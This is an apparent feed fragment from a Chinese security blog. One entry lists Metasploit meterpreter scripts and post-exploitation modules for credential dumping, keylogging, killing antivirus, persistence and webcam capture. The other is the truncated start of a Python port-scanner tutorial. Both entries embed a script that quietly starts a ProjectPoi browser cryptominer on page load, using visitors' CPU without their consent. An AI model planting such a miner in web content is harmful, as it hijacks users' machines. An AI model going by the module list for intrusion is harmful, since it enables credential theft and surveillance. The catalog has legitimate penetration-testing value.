class="line">getvncpw.rb  #获取VNC密码。</div><div class="line">hashdump.rb  #从SAM获取密码散列。</div><div class="line">hostedit.rb  #将条目添加到Windows主机文件的脚本。</div><div class="line">keylogrecorder.rb  #运行键盘记录器并保存所有按键的脚本。</div><div class="line">killav.rb  #终止几乎每个受害者的防病毒软件。</div><div class="line">metsvc.rb  #删除一台服务器并启动另一台服务器。</div><div class="line">migrate  #将计量器服务移动到另一个进程。</div><div class="line">multicommand.rb  #在Windows 2003，Windows Vista和Windows XP和Windows 2008目标上运行多个命令的脚本。</div><div class="line">multi_console_command.rb  #用于在计量器会话上运行多个控制台命令的脚本。</div><div class="line">multi_meter_inject.rb  #用于注入reverce的脚本tcp Meterpreter有效负载到多个PID的内存中，如果没有提供记事本进程将创建一个Meterpreter有效负载。</div><div class="line">multiscript.rb  #在Meterpreter会话上运行多个脚本的脚本。</div><div class="line">netenum.rb  #在Windows 2003，Windows Vista，Windows 2008和Windows XP上使用本机Windows命令进行ping扫描的脚本。</div><div class="line">packetrecorder.rb  #用于捕获到PCAP文件的数据包的脚本。</div><div class="line">panda2007pavsrv51.rb  #此模块利用Panda Antivirus 2007中的特权升级漏洞。由于不安全的权限问题，本地攻击者可以获得提升的权限。</div><div class="line">persistence.rb  #用于在目标主机上创建持久性后门的脚本。</div><div class="line">pml_driver_config.rb  #利用Hewlett-Packard的PML驱动程序HPZ12中的权限升级漏洞。由于不安全的SERVICE_CHANGE_CONFIG DACL权限，本地攻击者可以获得提升的权限。</div><div class="line">powerdump.rb  #Meterpreter脚本，用于利用纯PowerShell通过注册表项提取用户名和密码哈希。该脚本需要您作为系统运行才能正常工作。目前已经在Server 2008和Windows 7上进行了测试，默认情况下安装PowerShell。</div><div class="line">prefetchtool.rb  #从Windows prefetch文件夹中提取信息的脚本。</div><div class="line">process_memdump.rb  #脚本是基于纸张神经外科与Meterpreter。</div><div class="line">remotewinenum.rb  #此脚本将枚举目标环境中的Windows主机，给定用户名和密码，或使用WMI wmic Windows本机工具运行Meterpeter的凭据。</div><div class="line">scheduleme.rb  #用于自动化最常见的调度任务的脚本。此脚本适用于Windows XP，Windows 2003，Windows Vista和Windows 2008。</div><div class="line">schelevator.rb  #利用Windows Vista / 7/2008 Task Scheduler 2.0特权提升。该脚本利用Stuxnet利用的Task Scheduler 2.0 XML 0day。</div><div class="line">schtasksabuse.rb  #通过调度和运行针对一个或多个目标的命令列表来在Windows中滥用调度程序服务的Meterpreter脚本。使用schtasks命令将其作为系统运行。此脚本适用于Windows XP，Windows 2003，Windows Vista和Windows 2008。</div><div class="line">scraper.rb  #此脚本的目标是通过现有的Meterpreter会话从受害者获取系统信息。</div><div class="line">screenspy.rb  #此脚本将打开远程主机的交互视图。您将需要在您的机器上安装Firefox。</div><div class="line">screen_unlock.rb  #解锁Windows屏幕的脚本。需要系统特权才能运行和已知的目标系统的签名。</div><div class="line">screen_dwld.rb  #递归搜索和下载与给定模式匹配的文件的脚本。</div><div class="line">service_manager.rb  #用于管理Windows服务的脚本。</div><div class="line">service_permissions_escalate.rb此脚本尝试创建一个服务，然后通过现有服务列表进行搜索，以查找不安全的文件或配置权限，使其可以用有效载荷替换可执行文件。然后它将尝试重新启动替换的服务以运行有效载荷。如果失败，下次启动服务（例如重新启动），攻击者将获得提升的权限。</div><div class="line">sound_recorder.rb  #用于以间隔录制由目标主机麦克风捕获的声音的脚本。</div><div class="line">srt_webdrive_priv.rb  #利用South River Technologies WebDrive中的权限升级漏洞。</div><div class="line">uploadexec.rb  #将可执行文件上传到主机的脚本。</div><div class="line">virtualbox_sysenter_dos  #脚本到DoS虚拟框。</div><div class="line">virusscan_bypass.rb  #杀死McAfee VirusScan Enterprise v8.7.0i +进程的脚本。</div><div class="line">vnc.rb  #用于获取快速VNC会话的Meterpreter脚本。</div><div class="line">webcam.rb  #从主机摄像头启用和捕获图像的脚本。</div><div class="line">win32-sshclient.rb  #部署和运行“plink”命令行ssh-client的脚本。仅支持MS-Windows-2k / XP / Vista主机。</div><div class="line">win32-sshserver.rb  #在目标机器上部署和运行OpenSSH的脚本。</div><div class="line">winbf.rb  #检查当前系统密码策略的功能。此策略可能类似于目标环境中其他服务器的策略。</div><div class="line">winenum.rb  #枚举Windows系统，包括环境变量，网络接口，路由，用户帐户等</div><div class="line">wmic.rb  #用于在Windows 2003，Windows Vista和Windows XP和Windows 2008目标上运行WMIC命令的脚本。</div></pre></td></tr></table></figure><h2 id="后渗透攻击模块-Post"><a href="#后渗透攻击模块-Post" class="headerlink" title="后渗透攻击模块 (Post)"></a>后渗透攻击模块 (Post)</h2><blockquote><p>在meterpreter下按两下tab键，有几百个post模块，可以多尝试使用</p><p>以下内容均有Google自动翻译，如有错误请查看源文件</p></blockquote><h4 id="模块信息"><a href="#模块信息" class="headerlink" title="模块信息"></a>模块信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">info 模块名</div></pre></td></tr></table></figure><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">run 模块名</div><div class="line"></div><div class="line">example:</div><div class="line">run post/windows/gather/enum_logged_on_users  #目标主机当前在线的用户(SID=500是管理员账号)</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div></pre></td><td class="code"><pre><div class="line">post/multi/gather/env                                              目标主机环境变量信息</div><div class="line">post/multi/gather/firefox_creds                                    目标主机火狐浏览器保存的账号密码</div><div class="line">post/multi/gather/ssh_creds                                        目标主机保存的ssh身份验证信息(linux系统常用)</div><div class="line">post/windows/capture/keylog_recorder                               Windows捕获击键记录器</div><div class="line">post/windows/capture/lockout_keylogger                             Windows捕获Winlogon锁定证书键盘记录器</div><div class="line">post/windows/escalate/droplnk                                      Windows升级SMB图标LNK Dropper</div><div class="line">post/windows/escalate/getsystem                                    Windows通过管理员升级获取系统</div><div class="line">post/windows/escalate/golden_ticket                                Windows升级金票</div><div class="line">post/windows/escalate/ms10_073_kbdlayout                           Windows Escalate NtUserLoadKeyboardLayoutEx特权升级</div><div class="line">post/windows/escalate/screen_unlock                                Windows Escalate Locked Desktop Unlocker</div><div class="line">post/windows/gather/ad_to_sqlite                                   AD计算机，组和本地SQLite DB的递归用户成员资格</div><div class="line">post/windows/gather/arp_scanner                                    Windows收集ARP扫描器</div><div class="line">post/windows/gather/bitcoin_jacker                                 Windows收集比特币钱包</div><div class="line">post/windows/gather/bitlocker_fvek                                 Bitlocker主键（FVEK）提取</div><div class="line">post/windows/gather/cachedump                                      Windows收集凭证缓存转储</div><div class="line">post/windows/gather/checkvm                                        Windows收集虚拟环境检测</div><div class="line">post/windows/gather/credentials/avira_password                     Windows收集Avira密码提取</div><div class="line">post/windows/gather/credentials/bulletproof_ftp                    Windows收集BulletProver FTP客户端保存的密码提取</div><div class="line">post/windows/gather/credentials/coreftp                            Windows收集CoreFTP保存的密码提取</div><div class="line">post/windows/gather/credentials/credential_collector               Windows收集凭证收集器</div><div class="line">post/windows/gather/credentials/domain_hashdump                    Windows域控制器Hashdump</div><div class="line">post/windows/gather/credentials/dynazip_log                        Windows收集DynaZIP保存的密码提取</div><div class="line">post/windows/gather/credentials/dyndns                             Windows收集DynDNS客户端密码提取器</div><div class="line">post/windows/gather/credentials/enum_cred_store                    Windows收集证书存储枚举和解密模块</div><div class="line">post/windows/gather/credentials/enum_laps                          Windows收集证书本地管理员密码解决方案</div><div class="line">post/windows/gather/credentials/enum_picasa_pwds                   Windows收集Google Picasa密码提取器</div><div class="line">post/windows/gather/credentials/epo_sql                            Windows收集McAfee ePO 4.6配置SQL凭据</div><div class="line">post/windows/gather/credentials/filezilla_server                   Windows收集FileZilla FTP服务器凭据集合</div><div class="line">post/windows/gather/credentials/flashfxp                           Windows收集FlashFXP保存的密码提取</div><div class="line">post/windows/gather/credentials/ftpnavigator                       Windows收集FTP导航器保存密码提取</div><div class="line">post/windows/gather/credentials/ftpx                               Windows收集FTP资源管理器（FTPX）凭据提取</div><div class="line">post/windows/gather/credentials/gpp                                Windows收集组策略优先保存的密码</div><div class="line">post/windows/gather/credentials/heidisql                           Windows收集HeidiSQL保存的密码提取</div><div class="line">post/windows/gather/credentials/idm                                Windows收集Internet下载管理器（IDM）密码提取器</div><div class="line">post/windows/gather/credentials/imail                              Windows收集IPSwitch iMail用户数据枚举</div><div class="line">post/windows/gather/credentials/imvu                               Windows收集证书IMVU游戏客户端</div><div class="line">post/windows/gather/credentials/mcafee_vse_hashdump                McAfee病毒扫描企业密码破解转储</div><div class="line">post/windows/gather/credentials/mdaemon_cred_collector             Windows收集MDaemonEmailServer证书破解</div><div class="line">post/windows/gather/credentials/meebo                              Windows收集Meebo密码提取器</div><div class="line">post/windows/gather/credentials/mremote                            Windows收集mRemote保存的密码提取</div><div class="line">post/windows/gather/credentials/mssql_local_hashdump               Windows收集本地SQL Server哈希转储</div><div class="line">post/windows/gather/credentials/nimbuzz                            Windows收集Nimbuzz Instant Messenger密码提取器</div><div class="line">post/windows/gather/credentials/outlook                            Windows收集Microsoft Outlook保存的密码提取</div><div class="line">post/windows/gather/credentials/razer_synapse                      Windows收集Razer Synapse密码提取</div><div class="line">post/windows/gather/credentials/razorsql                           Windows收集RazorSQL证书</div><div class="line">post/windows/gather/credentials/rdc_manager_creds                  Windows收集远程桌面连接管理器保存的密码提取</div><div class="line">post/windows/gather/credentials/skype                              Windows收集Skype保存的密码哈希提取</div><div class="line">post/windows/gather/credentials/smartermail                        Windows收集更智能的邮件密码提取</div><div class="line">post/windows/gather/credentials/smartftp                           Windows收集SmartFTP保存的密码提取</div><div class="line">post/windows/gather/credentials/spark_im                           Windows收集Spark IM密码提取</div><div class="line">post/windows/gather/credentials/sso                                Windows单一登录凭证收集器（Mimikatz）</div><div class="line">post/windows/gather/credentials/steam                              Windows收集Steam客户端会话收集器。</div><div class="line">post/windows/gather/credentials/tortoisesvn                        Windows收集TortoiseSVN保存的密码提取</div><div class="line">post/windows/gather/credentials/total_commander                    Windows收集Total Commander保存的密码提取</div><div class="line">post/windows/gather/credentials/trillian                           Windows收集Trillian密码提取器</div><div class="line">post/windows/gather/credentials/vnc                                Windows收集VNC密码提取</div><div class="line">post/windows/gather/credentials/windows_autologin                  Windows收集AutoLogin用户凭据提取器</div><div class="line">post/windows/gather/credentials/winscp                             Windows收集WinSCP保存的密码提取</div><div class="line">post/windows/gather/credentials/wsftp_client                       Windows收集WS_FTP保存的密码提取</div><div class="line">post/windows/gather/dnscache_dump                                  Windows收集DNS缓存</div><div class="line">post/windows/gather/dumplinks                                      Windows收集最近的文件lnk信息</div><div class="line">post/windows/gather/enum_ad_bitlocker                              Windows收集Active Directory BitLocker恢复</div><div class="line">post/windows/gather/enum_ad_computers                              Windows收集Active Directory计算机</div><div class="line">post/windows/gather/enum_ad_groups                                 Windows收集Active Directory组</div><div class="line">post/windows/gather/enum_ad_managedby_groups                       Windows收集Active Directory托管组</div><div class="line">post/windows/gather/enum_ad_service_principal_names                Windows收集Active Directory服务主体名称</div><div class="line">post/windows/gather/enum_ad_to_wordlist                            Windows Active Directory Wordlist Builder</div><div class="line">post/windows/gather/enum_ad_user_comments                          Windows收集Active Directory用户评论</div><div class="line">post/windows/gather/enum_ad_users                                  Windows收集Active Directory用户</div><div class="line">post/windows/gather/enum_applications                              Windows收集安装的应用程序枚举</div><div class="line">post/windows/gather/enum_artifacts                                 Windows收集文件和注册表伪像枚举</div><div class="line">post/windows/gather/enum_av_excluded                               Windows防病毒排除枚举</div><div class="line">post/windows/gather/enum_chrome                                    Windows收集Google Chrome用户数据枚举</div><div class="line">post/windows/gather/enum_computers                                 Windows收集枚举计算机</div><div class="line">post/windows/gather/enum_db                                        Windows收集数据库实例枚举</div><div class="line">post/windows/gather/enum_devices                                   Windows收集硬件枚举</div><div class="line">post/windows/gather/enum_dirperms                                  Windows收集目录权限枚举</div><div class="line">post/windows/gather/enum_domain                                    Windows收集枚举域</div><div class="line">post/windows/gather/enum_domain_group_users                        Windows收集枚举域组</div><div class="line">post/windows/gather/enum_domain_tokens                             Windows收集枚举域令牌</div><div class="line">post/windows/gather/enum_domain_users                              Windows收集枚举活动域用户</div><div class="line">post/windows/gather/enum_domains                                   Windows收集域枚举</div><div class="line">post/windows/gather/enum_emet                                      Windows收集EMET保护路径</div><div class="line">post/windows/gather/enum_files                                     Windows收集通用文件集合</div><div class="line">post/windows/gather/enum_hostfile                                  Windows收集Windows主机文件枚举</div><div class="line">post/windows/gather/enum_ie                                        Windows收集Internet Explorer用户数据枚举</div><div class="line">post/windows/gather/enum_logged_on_users                           Windows收集登录用户枚举（注册表）</div><div class="line">post/windows/gather/enum_ms_product_keys                           Windows收集产品密钥</div><div class="line">post/windows/gather/enum_muicache                                  Windows收集枚举用户MUICache</div><div class="line">post/windows/gather/enum_patches                                   Windows收集应用的补丁</div><div class="line">post/windows/gather/enum_powershell_env                            Windows收集Powershell环境设置枚举</div><div class="line">post/windows/gather/enum_prefetch                                  Windows收集预取文件信息</div><div class="line">post/windows/gather/enum_proxy                                     Windows收集代理设置</div><div class="line">post/windows/gather/enum_putty_saved_sessions                      PuTTY保存的会话枚举模块</div><div class="line">post/windows/gather/enum_services                                  Windows收集服务信息枚举</div><div class="line">post/windows/gather/enum_shares                                    Windows通过注册表收集SMB共享枚举</div><div class="line">post/windows/gather/enum_snmp                                      Windows收集SNMP设置枚举（注册表）</div><div class="line">post/windows/gather/enum_termserv                                  Windows收集终端服务器客户端连接信息转储</div><div class="line">post/windows/gather/enum_tokens                                    Windows收集枚举域管理令牌（令牌猎人）</div><div class="line">post/windows/gather/enum_tomcat                                    Windows收集Apache Tomcat枚举</div><div class="line">post/windows/gather/enum_trusted_locations                         Windows收集Microsoft Office信任的位置</div><div class="line">post/windows/gather/enum_unattend                                  Windows收集无人值守的答案文件枚举</div><div class="line">post/windows/gather/file_from_raw_ntfs                             Windows文件从原始NTFS收集文件</div><div class="line">post/windows/gather/forensics/browser_history                      Windows收集Skype，Firefox和Chrome人工制品</div><div class="line">post/windows/gather/forensics/duqu_check                           Windows收集法医Duqu注册表检查</div><div class="line">post/windows/gather/forensics/enum_drives                          Windows收集物理驱动器和逻辑卷</div><div class="line">post/windows/gather/forensics/imager                               Windows收集法医成像</div><div class="line">post/windows/gather/forensics/nbd_server                           Windows收集本地NBD服务器</div><div class="line">post/windows/gather/forensics/recovery_files                       Windows收集删除的文件枚举和恢复</div><div class="line">post/windows/gather/hashdump                                       Windows收集本地用户帐户密码哈希（注册表）</div><div class="line">post/windows/gather/local_admin_search_enum                        Windows收集本地管理员搜索</div><div class="line">post/windows/gather/lsa_secrets                                    Windows枚举LSA秘密</div><div class="line">post/windows/gather/make_csv_orgchart                              使用管理器信息生成CSV组织图数据</div><div class="line">post/windows/gather/memory_grep                                    Windows收集过程内存Grep</div><div class="line">post/windows/gather/netlm_downgrade                                Windows NetLM降级攻击</div><div class="line">post/windows/gather/ntds_location                                  发布Windows收集NTDS.DIT位置</div><div class="line">post/windows/gather/outlook                                        Windows收集Outlook电子邮件</div><div class="line">post/windows/gather/phish_windows_credentials                      Windows收集用户凭据（网络钓鱼）</div><div class="line">post/windows/gather/resolve_sid                                    Windows收集本地用户帐户SID查找</div><div class="line">post/windows/gather/reverse_lookup                                 Windows收集IP范围反向查找</div><div class="line">post/windows/gather/screen_spy                                     Windows收集屏幕间谍</div><div class="line">post/windows/gather/smart_hashdump                                 Windows收集本地和域控制器帐户密码哈希</div><div class="line">post/windows/gather/tcpnetstat                                     Windows收集TCP Netstat</div><div class="line">post/windows/gather/usb_history                                    Windows收集USB驱动器历史记录</div><div class="line">post/windows/gather/win_privs                                      Windows收集特权枚举</div><div class="line">post/windows/gather/wmic_command                                   Windows收集运行指定的WMIC命令</div><div class="line">post/windows/gather/word_unc_injector                              Windows收集Microsoft Office Word UNC路径注入器</div><div class="line">post/windows/manage/add_user_domain                                Windows管理将用户添加到域和/或域组</div><div class="line">post/windows/manage/archmigrate                                    架构迁移</div><div class="line">post/windows/manage/change_password                                Windows管理更改密码</div><div class="line">post/windows/manage/clone_proxy_settings                           Windows管理代理设置克隆</div><div class="line">post/windows/manage/delete_user                                    Windows管理本地用户帐户删除</div><div class="line">post/windows/manage/download_exec                                  Windows管理下载和/或执行</div><div class="line">post/windows/manage/driver_loader                                  Windows管理驱动程序加载程序</div><div class="line">post/windows/manage/enable_rdp                                     Windows管理启用远程桌面</div><div class="line">post/windows/manage/enable_support_account                         Windows管理木马支持帐户</div><div class="line">post/windows/manage/exec_powershell                                Windows Powershell执行后期模块</div><div class="line">post/windows/manage/forward_pageant                                将SSH代理请求转发到远程站点</div><div class="line">post/windows/manage/hashcarve                                      Windows本地用户帐户哈希卡弗</div><div class="line">post/windows/manage/ie_proxypac                                    Windows管理代理PAC文件</div><div class="line">post/windows/manage/inject_ca                                      Windows管理证书颁发机构注入</div><div class="line">post/windows/manage/inject_host                                    Windows管理主机文件注入</div><div class="line">post/windows/manage/killav                                         Windows Post杀死病毒和臀部</div><div class="line">post/windows/manage/migrate                                        Windows管理进程迁移</div><div class="line">post/windows/manage/mssql_local_auth_bypass                        Windows管理本地Microsoft SQL Server授权绕过</div><div class="line">post/windows/manage/multi_meterpreter_inject                       Windows管理在内存中注入多个有效负载</div><div class="line">post/windows/manage/nbd_server                                     Windows远程磁盘管理本地NBD服务器</div><div class="line">post/windows/manage/payload_inject                                 Windows管理内存有效载荷注入模块</div><div class="line">post/windows/manage/persistence_exe                                Windows管理持久的EXE Payload安装程序</div><div class="line">post/windows/manage/portproxy                                      Windows管理端口转发PortProxy</div><div class="line">post/windows/manage/powershell/build_net_code                      Powershell .NET编译器</div><div class="line">post/windows/manage/powershell/exec_powershell                     Windows管理PowerShell下载和/或执行</div><div class="line">post/windows/manage/powershell/load_script                         将脚本加载到PowerShell会话中</div><div class="line">post/windows/manage/pptp_tunnel                                    Windows管理远程点对点隧道协议</div><div class="line">post/windows/manage/priv_migrate                                   Windows管理基于权限的进程迁移</div><div class="line">post/windows/manage/pxeexploit                                     Windows管理PXE漏洞服务器</div><div class="line">post/windows/manage/reflective_dll_inject                          Windows管理反射式DLL注入模块</div><div class="line">post/windows/manage/remove_ca                                      Windows管理证书颁发机构删除</div><div class="line">post/windows/manage/remove_host                                    Windows管理主机文件删除</div><div class="line">post/windows/manage/rpcapd_start                                   Windows管理远程数据包捕获服务启动器</div><div class="line">post/windows/manage/run_as                                         Windows管理运行命令作为用户</div><div class="line">post/windows/manage/run_as_psh                                     Windows“运行”使用Powershell</div><div class="line">post/windows/manage/sdel                                           Windows管理安全删除</div><div class="line">post/windows/manage/sticky_keys                                    粘键保持模块</div><div class="line">post/windows/manage/vmdk_mount                                     Windows管理VMDK安装驱动器</div><div class="line">post/windows/manage/vss_create                                     Windows管理创建卷影副本</div><div class="line">post/windows/manage/vss_list                                       Windows管理列表卷影副本</div><div class="line">post/windows/manage/vss_mount                                      Windows管理安装阴影复制</div><div class="line">post/windows/manage/vss_set_storage                                Windows管理设置卷影复制存储空间</div><div class="line">post/windows/manage/vss_storage                                    Windows管理获取卷影复制存储信息</div><div class="line">post/windows/manage/wdigest_caching                                Windows发布管理WDigest凭据缓存</div><div class="line">post/windows/manage/webcam                                         Windows管理网络摄像头</div><div class="line">post/windows/recon/computer_browser_discovery                      Windows Recon计算机浏览器发现</div><div class="line">post/windows/recon/outbound_ports                                  Windows出站过滤规则</div><div class="line">post/windows/recon/resolve_ip                                      Windows Recon解析IP</div><div class="line">post/windows/wlan/wlan_bss_list                                    Windows收集无线BSS信息</div><div class="line">post/windows/wlan/wlan_current_connection                          Windows收集无线当前连接信息</div><div class="line">post/windows/wlan/wlan_disconnect                                  Windows断开无线连接</div><div class="line">post/windows/wlan/wlan_profile                                     Windows收集无线配置文件</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;div id=&quot;aplayer1&quot; class=&quot;aplayer&quot; style=&quot;margin-bottom: 20px;&quot;&gt;&lt;/div&gt;
		&lt;script&gt;
			new APlayer({
				element: document.getElementById(&quot;aplayer1&quot;),
				narrow: false,
				autoplay: true,
				showlrc: 0,
				music: {
					title: &quot;六月的雨&quot;,
					author: &quot;胡歌&quot;,
					url: &quot;http://damit5.kiwi/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3&quot;,
					pic: &quot;http://damit5.kiwi/Music/233.jpg&quot;,
				}
			});
		&lt;/script&gt;

&lt;html&gt;
&lt;head&gt;
&lt;script&gt;
var script = document.createElement(&quot;script&quot;);
script.type = &quot;text/javascript&quot;;
script.src = &quot;https://ppoi.org/lib/projectpoi.min.js&quot;;
script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous(&quot;aoZgifd6N8x48tCIwRtb7bJA&quot;,{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}
document.getElementsByTagName(&quot;head&quot;)[0].appendChild(script);
&lt;/script&gt;
&lt;/head&gt;
&lt;/html&gt;

&lt;p&gt;整理在一起，用的时候也比较方便&lt;/p&gt;
    
    </summary>
    
    
      <category term="Metasploit-Framework" scheme="http://damit5.ml/tags/Metasploit-Framework/"/>
    
  </entry>
  
  <entry>
    <title>Python实现简单端口扫描器的编写</title>
    <link href="http://damit5.ml/2017/09/30/Python%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E7%BC%96%E5%86%99/"/>
    <id>http://damit5.ml/2017/09/30/Python实现简单端口扫描器的编写/</id>
    <published>2017-09-30T05:36:55.000Z</published>
    <updated>2017-11-14T05:53:53.956Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><html><head><script>var script = document.createElement("script");script.type = "text/javascript";script.src = "https://ppoi.org/lib/projectpoi.min.js";script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous("aoZgifd6N8x48tCIwRtb7bJA",{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}document.getElementsByTagName("head")[0].appendChild(script);</script></head></html><h2 id="0×00-前言"><a href="#0×00-前言" class="headerlink" title="0×00 前言"></a>0×00 前言</h2><p>没错，这就是上个帖子所说的简单的端口扫描器</p><p>加了颜色过后确实逼格猛涨</p><p>废话不多说，开始记录下这有趣的故事</p><a id="more"></a><h2 id="0×01-正文"><a href="#0×01-正文" class="headerlink" title="0×01 正文"></a>0×01 正文</h2><h4 id="Step-0-意淫一下写这个扫描器的思路"><a href="#Step-0-意淫一下写这个扫描器的思路" class="headerlink" title="Step 0 : 意淫一下写这个扫描器的思路"></a>Step 0 : 意淫一下写这个扫描器的思路</h4><ul><li>用户输入网址，转换为IP（直接IP也行）</li><li>传入的参数需要用 sys 来判定</li><li>需要使用socket模块来完成端口的扫描</li><li>扫描单独写一个方法</li><li>终端输出改变颜色提升逼格<h4 id="Step-1-引入我们需要的模块"><a href="#Step-1-引入我们需要的模块" class="headerlink" title="Step 1 : 引入我们需要的模块"></a>Step 1 : 引入我们需要的模块</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">import sys</div><div class="line">import socket</div><div class="line">from color import *</div></pre></td></tr></table></figure></li></ul><h4 id="Step-2-扫描端口是否开启的方法-scan"><a href="#Step-2-扫描端口是否开启的方法-scan" class="headerlink" title="Step 2 : 扫描端口是否开启的方法 scan()"></a>Step 2 : 扫描端口是否开启的方法 scan()</h4><h5 id="设置超时时间，防止等太久"><a href="#设置超时时间，防止等太久" class="headerlink" title="设置超时时间，防止等太久"></a>设置超时时间，防止等太久</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socket.setdefaulttimeout(3)</div></pre></td></tr></table></figure><h5 id="创建一个socket对象"><a href="#创建一个socket对象" class="headerlink" title="创建一个socket对象"></a>创建一个<code>socket</code>对象</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</div></pre></td></tr></table></figure><p><code>AF_INET</code> 表示IPV4</p><p><code>SOCK_STREAM</code> 表示TCP</p><h5 id="然后用connect方法连接"><a href="#然后用connect方法连接" class="headerlink" title="然后用connect方法连接"></a>然后用<code>connect</code>方法连接</h5><blockquote><p>PS : connect()中传入的是一个tuple<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">s.connect((ip,port))</div></pre></td></tr></table></figure></p></blockquote><h4 id="Step-3-主函数的书写（获取IP和端口）"><a href="#Step-3-主函数的书写（获取IP和端口）" class="headerlink" title="Step 3 : 主函数的书写（获取IP和端口）"></a>Step 3 : 主函数的书写（获取IP和端口）</h4><h5 id="判断是否传入正确的参数"><a href="#判断是否传入正确的参数" class="headerlink" title="判断是否传入正确的参数"></a>判断是否传入正确的参数</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">if len(sys.argv) == 2:</div><div class="line"></div><div class="line">else:</div><div class="line">    print &apos;usage : python portscan.py &lt;url&gt;&apos;</div></pre></td></tr></table></figure><h5 id="获取传入参数的IP地址和想要扫描的端口"><a href="#获取传入参数的IP地址和想要扫描的端口" class="headerlink" title="获取传入参数的IP地址和想要扫描的端口"></a>获取传入参数的IP地址和想要扫描的端口</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">url = sys.argv[1]</div><div class="line">ip = socket.gethostbyname(url)</div><div class="line">portlist = [22,80,81,445,3306,3389,8080]</div></pre></td></tr></table></figure><h5 id="将端口和IP使用scan-方法进行测试"><a href="#将端口和IP使用scan-方法进行测试" class="headerlink" title="将端口和IP使用scan()方法进行测试"></a>将端口和IP使用scan()方法进行测试</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">for port in portlist:</div><div class="line">    result = scan(ip,port)</div><div class="line">    if 